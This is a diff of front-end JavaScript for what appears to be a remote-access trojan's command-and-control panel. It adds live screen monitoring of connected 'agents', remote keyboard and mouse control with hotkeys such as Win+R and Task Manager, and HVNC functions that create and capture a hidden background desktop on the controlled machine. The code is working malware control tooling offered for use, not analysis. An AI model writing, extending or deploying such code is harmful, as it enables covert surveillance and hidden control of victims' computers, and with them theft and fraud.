+function closeFeatConfig(){document.getElementById('featModal').classList.remove('show')}
+function renderFeatList(){
+  const el=document.getElementById('featList');
+  el.innerHTML=featEditing.map((f,i)=>`
+    <div class="feat-item-config" draggable="true" data-idx="${i}"
+      ondragstart="featDragStart(event)" ondragover="featDragOver(event)" ondragleave="featDragLeave(event)" ondrop="featDrop(event)" ondragend="featDragEnd(event)">
+      <span class="fi-drag">⋮⋮</span>
+      <span class="fi-name">${esc(f.name)}</span>
+      <span class="fi-status ${f.status}">${f.status==='done'?'✓ 已实现':'<span>⚙ 开发中</span>'}</span>
+      <button class="fi-del" onclick="event.stopPropagation();delFeatItem(${i})" title="删除">×</button>
+    </div>`).join('');
+}
+function addFeatItem(){
+  const inp=document.getElementById('featNewName'),name=inp.value.trim();
+  if(!name)return;
+  const status=document.getElementById('featNewStatus').value;
+  featEditing.push({name,status});
+  inp.value='';inp.focus();
+  renderFeatList();
+}
+function delFeatItem(idx){featEditing.splice(idx,1);renderFeatList()}
+function resetFeatDefault(){featEditing=DEFAULT_FEATURES.map(f=>({...f}));renderFeatList()}
+function saveFeatConfig(){
+  features=featEditing.map(f=>({...f}));
+  saveFeatures();
+  renderFeatureBar();
+  closeFeatConfig();
+  toast('功能栏配置已保存','ok');
+}
+// Drag & drop
+let featDragIdx=null;
+function featDragStart(e){featDragIdx=parseInt(e.currentTarget.dataset.idx);e.currentTarget.classList.add('dragging')}
+function featDragOver(e){e.preventDefault();e.currentTarget.classList.add('drag-over')}
+function featDragLeave(e){e.currentTarget.classList.remove('drag-over')}
+function featDrop(e){
+  e.preventDefault();e.currentTarget.classList.remove('drag-over');
+  const toIdx=parseInt(e.currentTarget.dataset.idx);
+  if(featDragIdx!==null&&featDragIdx!==toIdx){
+    const item=featEditing.splice(featDragIdx,1)[0];
+    featEditing.splice(toIdx,0,item);
+    renderFeatList();
+  }
+  featDragIdx=null;
+}
+function featDragEnd(e){e.currentTarget.classList.remove('dragging');featDragIdx=null}
+
+// ===== SCREEN MONITOR =====
+function openMonitor(){
+  if(!selectedId){toast('请先在左侧选择一个上线 Agent','warn');return;}
+  monitoringAgentId=selectedId;
+  document.getElementById('monitor-overlay').classList.add('show');
+  document.getElementById('moTitle').textContent=`屏幕监控 — ${selectedId}`;
+  document.getElementById('moAgentId').textContent=selectedId;
+  document.getElementById('moLastUpdate').textContent='';
+}
+
+function closeMonitor(){
+  stopMonitoring();
+  if(controlActive)toggleControl();
+  if(ctrlOverlay)ctrlOverlay.style.display='none';
+  document.getElementById('monitor-overlay').classList.remove('show');
+}
+
+function toggleMonitoring(){
+  if(monitoringActive){stopMonitoring();}
+  else{startMonitoring();}
+}
+
+function startMonitoring(){
+  if(!selectedId){toast('未选择 Agent','warn');return;}
+  if(monitoringActive)return;
+
+  if(selectedId!==monitoringAgentId){
+    monitoringAgentId=selectedId;
+    document.getElementById('moTitle').textContent=`屏幕监控 — ${selectedId}`;
+    document.getElementById('moAgentId').textContent=selectedId;
+    const canvas=document.getElementById('moCanvas');
+    const ctx=canvas.getContext('2d');
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    document.getElementById('moCanvas').style.display='none';
+    document.getElementById('moPlaceholder').style.display='';
+  }
+
+  monitoringActive=true;
+  moFrameCount=0;moTrafficKB=0;moStartTime=Date.now();
+  document.getElementById('moBtn').textContent='停止';
+  document.getElementById('moBtn').classList.add('danger');
+  document.getElementById('moLiveDot').style.display='';
+  document.getElementById('moFrame').textContent='0';
+  document.getElementById('moTraffic').textContent='0';
+  document.getElementById('moElapsed').textContent='00:00';
+
+  const interval=parseInt(document.getElementById('moInterval').value)||2000;
+  requestScreenshot(monitoringAgentId);
+  monitoringTimer=setInterval(()=>{
+    if(monitoringActive)requestScreenshot(monitoringAgentId);
+  },interval);
+
+  if(!window._moElapsedTimer) window._moElapsedTimer=setInterval(()=>{
+    if(!moStartTime)return;
+    const s=Math.floor((Date.now()-moStartTime)/1000);
+    document.getElementById('moElapsed').textContent=
+      String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');
+  },1000);
+}
+
+function stopMonitoring(){
+  monitoringActive=false;
+  if(monitoringTimer){clearInterval(monitoringTimer);monitoringTimer=null;}
+  document.getElementById('moBtn').textContent='开始';
+  document.getElementById('moBtn').classList.remove('danger');
+  document.getElementById('moLiveDot').style.display='none';
+  moStartTime=null;
+}
+
+// Canvas-based frame update — no flash/stutter
+function updateMonitorFrame(b64,agentId){
+  resetMonitorInterval();
+  moLastB64=b64;
+  const canvas=document.getElementById('moCanvas');
+  const ph=document.getElementById('moPlaceholder');
+  const ctx=canvas.getContext('2d');
+
+  const src=`data:image/jpeg;base64,${b64}`;
+  const img=new Image();
+  img.onload=()=>{
+    // Maintain aspect ratio within viewport
+    const maxW=window.innerWidth*0.98;
+    const maxH=(window.innerHeight-44);
+    let w=img.width,h=img.height;
+    if(w>maxW||h>maxH){
+      const scale=Math.min(maxW/w,maxH/h);
+      w=Math.round(w*scale);h=Math.round(h*scale);
+    }
+    canvas.width=w;canvas.height=h;
+    ctx.drawImage(img,0,0,w,h);
+    canvas.style.display='';
+    ph.style.display='none';
+  };
+  img.src=src;
+
+  moFrameCount++;
+  moTrafficKB+=Math.round(b64.length/1024);
+  document.getElementById('moFrame').textContent=moFrameCount;
+  document.getElementById('moTraffic').textContent=moTrafficKB;
+  document.getElementById('moLastUpdate').textContent=new Date().toLocaleTimeString();
+}
+
+function changeInterval(){
+  if(monitoringActive){
+    if(monitoringTimer){clearInterval(monitoringTimer);monitoringTimer=null;}
+    const interval=parseInt(document.getElementById('moInterval').value)||2000;
+    monitoringTimer=setInterval(()=>{
+      if(monitoringActive)requestScreenshot(monitoringAgentId);
+    },interval);
+  }
+}
+
+// ── ADAPTIVE INTERVAL ──
+let stillCount=0;
+const STILL_THRESHOLD=3;       // N consecutive SAME frames before doubling
+const MAX_INTERVAL=3000;       // cap at 3s to avoid too sluggish
+const BASE_INTERVAL=500;
+
+function handleMonitorSame(){
+  stillCount++;
+  moFrameCount++;
+  // Show dim red dot for skipped frames
+  document.getElementById('moLiveDot').style.opacity='0.4';
+  if(stillCount>=STILL_THRESHOLD){
+    stillCount=STILL_THRESHOLD;
+    increaseMonitorInterval();
+  }
+}
+
+function increaseMonitorInterval(){
+  if(!monitoringActive||!monitoringTimer)return;
+  const sel=document.getElementById('moInterval');
+  const cur=parseInt(sel.value)||1000;
+  const next=Math.min(cur*2,MAX_INTERVAL);
+  if(next===cur)return;
+  sel.value=String(next);
+  clearInterval(monitoringTimer);
+  monitoringTimer=setInterval(()=>{
+    if(monitoringActive)requestScreenshot(monitoringAgentId);
+  },next);
+  document.getElementById('moLastUpdate').textContent='⏸ '+new Date().toLocaleTimeString();
+}
+
+function resetMonitorInterval(){
+  stillCount=0;
+  document.getElementById('moLiveDot').style.opacity='1';
+  const sel=document.getElementById('moInterval');
+  if(parseInt(sel.value)!==BASE_INTERVAL){
+    sel.value=String(BASE_INTERVAL);
+    if(monitoringActive&&monitoringTimer){
+      clearInterval(monitoringTimer);
+      monitoringTimer=setInterval(()=>{
+        if(monitoringActive)requestScreenshot(monitoringAgentId);
+      },BASE_INTERVAL);
+    }
+  }
+}
+
+// ===== SCREEN CONTROL =====
+
+function saveMonitorFrame(){
+  const canvas=document.getElementById('moCanvas');
+  if(!canvas.width||!moLastB64)return;
+  canvas.toBlob(blob=>{
+    const a=document.createElement('a');
+    a.href=URL.createObjectURL(blob);
+    a.download=`monitor_${new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)}.png`;
+    a.click();
+    URL.revokeObjectURL(a.href);
+  },'image/jpeg');
+}
+
+// ── SCREEN CONTROL ──
+let controlActive=false;
+let keyBuffer='';
+let keyBufferTimer=null;
+let ctrlOverlay=null;
+
+function toggleControl(){
+  if(!monitoringActive||!monitoringAgentId){toast('请先开始监控','warn');return;}
+  controlActive=!controlActive;
+  const btn=document.getElementById('moCtrlBtn');
+  const canvas=document.getElementById('moCanvas');
+  const hint=document.getElementById('moCtrlHint');
+  if(controlActive){
+    btn.textContent='取消控制';
+    btn.classList.add('danger');
+    canvas.style.cursor='crosshair';
+    canvas.style.outline='2px solid var(--accent)';
+    canvas.onclick=handleCanvasClick;
+    canvas.oncontextmenu=handleCanvasRightClick;
+    // Aggressive keyboard capture: window level, capture phase, all events
+    window.addEventListener('keydown',handleControlKeyDown,true);
+    window.addEventListener('keypress',handleControlKeyPress,true);
+    window.addEventListener('keyup',handleControlKeyUp,true);
+    // Show overlay hint on mo-body
+    if(!ctrlOverlay){
+      ctrlOverlay=document.createElement('div');
+      ctrlOverlay.id='moCtrlOverlay';
+      ctrlOverlay.style.cssText='position:absolute;top:4px;left:50%;transform:translateX(-50%);z-index:5;display:none;text-align:center';
+      ctrlOverlay.innerHTML=`
+        <div style="background:rgba(6,182,212,0.85);color:#000;padding:2px 14px;border-radius:3px 3px 0 0;font-size:11px;font-weight:600;pointer-events:none">
+          控制中 — 键盘·鼠标实时转发至远程 | Esc 退出
+        </div>
+        <div id="moHotbar" style="display:flex;gap:2px;background:rgba(0,0,0,0.7);padding:2px 4px;border-radius:0 0 3px 3px;justify-content:center;flex-wrap:wrap">
+          <button title="Win+R 运行" onclick="event.stopPropagation();sendHotkeyCombo('LWIN','r')">Win+R</button>
+          <button title="Win+E 资源管理器" onclick="event.stopPropagation();sendHotkeyCombo('LWIN','e')">Win+E</button>
+          <button title="Win+D 桌面" onclick="event.stopPropagation();sendHotkeyCombo('LWIN','d')">Win+D</button>
+          <button title="Win+Tab 任务视图" onclick="event.stopPropagation();sendHotkeyCombo('LWIN','Tab')">Win+Tab</button>
+          <button title="Alt+F4 关闭" onclick="event.stopPropagation();sendHotkeyCombo('Alt','F4')">Alt+F4</button>
+          <button title="Ctrl+Shift+Esc 任务管理器" onclick="event.stopPropagation();sendHotkeyCombo2('Ctrl','Shift','Escape')">Ctrl+Shift+Esc</button>
+          <button title="Win+L 锁屏" onclick="event.stopPropagation();sendHotkeyCombo('LWIN','l')">Win+L</button>
+        </div>`;
+      document.getElementById('moBody').appendChild(ctrlOverlay);
+      // Inject hotbar button styles
+      const hs=document.createElement('style');
+      hs.textContent='#moHotbar button{background:rgba(255,255,255,0.08);color:#ccc;border:1px solid rgba(255,255,255,0.12);border-radius:2px;padding:1px 5px;font-size:10px;cursor:pointer;font-family:inherit;white-space:nowrap}#moHotbar button:hover{background:rgba(6,182,212,0.3);color:#fff;border-color:rgba(6,182,212,0.5)}';
+      document.head.appendChild(hs);
+    }
+    ctrlOverlay.style.display='';
+    hint.style.display='';
+    hint.textContent='| 控制中 — Esc 退出';
+  }else{
+    btn.textContent='控制屏幕';
+    btn.classList.remove('danger');
+    canvas.style.cursor='';
+    canvas.style.outline='';
+    canvas.onclick=null;
+    canvas.oncontextmenu=null;
+    window.removeEventListener('keydown',handleControlKeyDown,true);
+    window.removeEventListener('keypress',handleControlKeyPress,true);
+    window.removeEventListener('keyup',handleControlKeyUp,true);
+    if(ctrlOverlay)ctrlOverlay.style.display='none';
+    hint.style.display='none';
+    flushKeyBuffer();
+  }
+}
+
+function handleCanvasClick(e){
+  if(!controlActive)return;
+  const canvas=document.getElementById('moCanvas');
+  const rect=canvas.getBoundingClientRect();
+  const rx=(e.clientX-rect.left)/rect.width;
+  const ry=(e.clientY-rect.top)/rect.height;
+  sendCtrlCmd(`mouse_click ${Math.round(rx*10000)} ${Math.round(ry*10000)} left`);
+}
+
+function handleCanvasRightClick(e){
+  e.preventDefault();
+  if(!controlActive)return;
+  const canvas=document.getElementById('moCanvas');
+  const rect=canvas.getBoundingClientRect();
+  const rx=(e.clientX-rect.left)/rect.width;
+  const ry=(e.clientY-rect.top)/rect.height;
+  sendCtrlCmd(`mouse_click ${Math.round(rx*10000)} ${Math.round(ry*10000)} right`);
+}
+
+function flushKeyBuffer(){
+  if(keyBuffer.length>0){
+    sendCtrlCmd(`keyboard_type ${keyBuffer}`);
+    keyBuffer='';
+  }
+  if(keyBufferTimer){clearTimeout(keyBufferTimer);keyBufferTimer=null;}
+}
+
+function handleControlKeyDown(e){
+  if(!controlActive)return;
+
+  // Escape: cancel control
+  if(e.key==='Escape'){
+    e.preventDefault();e.stopImmediatePropagation();
+    toggleControl();
+    return;
+  }
+
+  // Meta/Super key: ignore (OS shortcuts)
+  if(e.metaKey){
+    return;
+  }
+
+  // Ctrl combos: forward all single-char Ctrl+key (letters/numbers/symbols)
+  // Skip ctrl-only modifiers, handle actual combos
+  if(e.ctrlKey && e.key!=='Control'){
+    e.preventDefault();e.stopImmediatePropagation();
+    flushKeyBuffer();
+    if(e.shiftKey){
+      sendCtrlCmd(`keyboard_combo Ctrl+Shift ${e.key}`);
+    }else if(e.altKey){
+      sendCtrlCmd(`keyboard_combo Ctrl+Alt ${e.key}`);
+    }else{
+      sendCtrlCmd(`keyboard_combo Ctrl ${e.key}`);
+    }
+    return;
+  }
+
+  // Alt combos: forward all single-char Alt+key
+  if(e.altKey && e.key!=='Alt'){
+    e.preventDefault();e.stopImmediatePropagation();
+    flushKeyBuffer();
+    sendCtrlCmd(`keyboard_combo Alt ${e.key}`);
+    return;
+  }
+
+  // Function / special keys
+  const special={
+    'Backspace':'Backspace','Delete':'Delete',
+    'ArrowUp':'ArrowUp','ArrowDown':'ArrowDown',
+    'ArrowLeft':'ArrowLeft','ArrowRight':'ArrowRight',
+    'Tab':'Tab','Home':'Home','End':'End',
+    'PageUp':'PageUp','PageDown':'PageDown',
+    'F1':'F1','F2':'F2','F3':'F3','F4':'F4','F5':'F5',
+    'F6':'F6','F7':'F7','F8':'F8','F9':'F9','F10':'F10',
+    'F11':'F11','F12':'F12'
+  };
+  if(special[e.key]){
+    e.preventDefault();e.stopImmediatePropagation();
+    flushKeyBuffer();
+    sendCtrlCmd(`keyboard_press ${special[e.key]}`);
+    return;
+  }
+
+  // Enter
+  if(e.key==='Enter'){
+    e.preventDefault();e.stopImmediatePropagation();
+    flushKeyBuffer();
+    sendCtrlCmd('keyboard_press Enter');
+    return;
+  }
+
+  // Printable character
+  if(e.key.length===1 && !e.ctrlKey && !e.altKey && !e.metaKey){
+    e.preventDefault();e.stopImmediatePropagation();
+    keyBuffer+=e.key;
+    if(keyBufferTimer)clearTimeout(keyBufferTimer);
+    keyBufferTimer=setTimeout(flushKeyBuffer,250);
+  }
+}
+
+function handleControlKeyPress(e){
+  if(!controlActive)return;
+  e.preventDefault();e.stopImmediatePropagation();
+}
+
+function handleControlKeyUp(e){
+  if(!controlActive)return;
+  e.preventDefault();e.stopImmediatePropagation();
+}
+
+async function sendCtrlCmd(cmd){
+  if(!monitoringAgentId){toast('未选择 Agent','warn');return;}
+  try{
+    const r=await apiFetch('/api/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:monitoringAgentId,cmd})});
+    const d=await r.json();
+    if(!r.ok)toast(d.error||'控制命令失败','err');
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+
+// Hotkey button helpers (bypass browser Meta key limitation)
+async function sendHotkeyCombo(mod,key){
+  sendCtrlCmd(`keyboard_combo ${mod} ${key}`);
+}
+async function sendHotkeyCombo2(mod1,mod2,key){
+  sendCtrlCmd(`keyboard_combo ${mod1} ${mod2} ${key}`);
+}
+
+// ===== HVNC =====
+let hvncActive=false,hvncAgentId=null;
+
+function openHvnc(){
+  if(!selectedId){toast('请先在左侧选择一个上线 Agent','warn');return;}
+  hvncAgentId=selectedId;
+  document.getElementById('hvnc-overlay').style.display='flex';
+  document.getElementById('hvncTitle').textContent=`后台屏幕 — ${selectedId}`;
+  document.getElementById('hvncAgentId').textContent=selectedId;
+  document.getElementById('hvncStatus').textContent='就绪';
+  document.getElementById('hvncBtn').textContent='创建桌面';
+}
+
+function closeHvnc(){
+  document.getElementById('hvnc-overlay').style.display='none';
+  const canvas=document.getElementById('hvncCanvas');
+  canvas.style.display='none';
+  canvas.width=0;canvas.height=0;
+  document.getElementById('hvncPlaceholder').style.display='';
+  hvncActive=false;
+}
+
+async function toggleHvncSession(){
+  if(!hvncAgentId){toast('无 Agent','warn');return;}
+  if(hvncActive){
+    // destroy
+    try{
+      const r=await apiFetch('/api/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:hvncAgentId,cmd:'hvnc_destroy'})});
+      const d=await r.json();
+      if(r.ok){hvncActive=false;document.getElementById('hvncBtn').textContent='创建桌面';document.getElementById('hvncStatus').textContent='已销毁';}
+      else toast(d.error||'销毁失败','err');
+    }catch(e){toast('请求失败: '+e.message,'err')}
+  }else{
+    // create
+    try{
+      const r=await apiFetch('/api/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:hvncAgentId,cmd:'hvnc_create'})});
+      const d=await r.json();
+      if(r.ok){hvncActive=true;document.getElementById('hvncBtn').textContent='销毁桌面';document.getElementById('hvncStatus').textContent='运行中';hvncRefresh();}
+      else toast(d.error||'创建失败','err');
+    }catch(e){toast('请求失败: '+e.message,'err')}
+  }
+}
+
+async function hvncRefresh(){
+  if(!hvncActive){toast('请先创建后台桌面','warn');return;}
+  try{
+    const r=await apiFetch('/api/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:hvncAgentId,cmd:'hvnc_screenshot'})});
+    if(!r.ok){const d=await r.json();toast(d.error||'截图失败','err');return;}
+    const blob=await r.blob();
+    const url=URL.createObjectURL(blob);
+    const img=new Image();
+    img.onload=()=>{
+      const canvas=document.getElementById('hvncCanvas');
+      canvas.width=img.naturalWidth;
+      canvas.height=img.naturalHeight;
+      canvas.getContext('2d').drawImage(img,0,0);
+      canvas.style.display='block';
+      document.getElementById('hvncPlaceholder').style.display='none';
+      URL.revokeObjectURL(url);
+    };
+    img.src=url;
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+
+// ===== INIT =====
+setInterval(()=>{document.getElementById('clock').textContent=new Date().toTimeString().slice(0,8)},1000);
+document.addEventListener('keydown',e=>{if(e.key==='Escape'){document.getElementById('detailModal').classList.remove('show');document.getElementById('screenshot-overlay').classList.remove('show');closeMonitor();closeHvnc()}});
+
+// Restore persisted logs
+try{
+  const saved=localStorage.getItem('sf_logs');
+  if(saved){
+    const entries=JSON.parse(saved);
+    logEntries=entries.slice(-MAX_LOG_ENTRIES);
+    const viewer=document.getElementById('logViewer');
+    logEntries.forEach(e=>{
+      const entry=document.createElement('div');
+      entry.className=`log-entry ${e.cat}`;
+      entry.dataset.cat=e.cat;
+      entry.innerHTML=`<span class="log-ts">${fmtLogTime(e.ts)}</span><span class="log-cat">[${e.cat.toUpperCase()}]</span><span class="log-msg">${esc(e.msg)}</span>`;
+      viewer.appendChild(entry);
+    });
+  }
+}catch(e){}
+
+connectWS();
+loadListeners();
+loadFeatures();
+renderFeatureBar();
+loadAgentCache();
+</script>
+</body>
+</html>
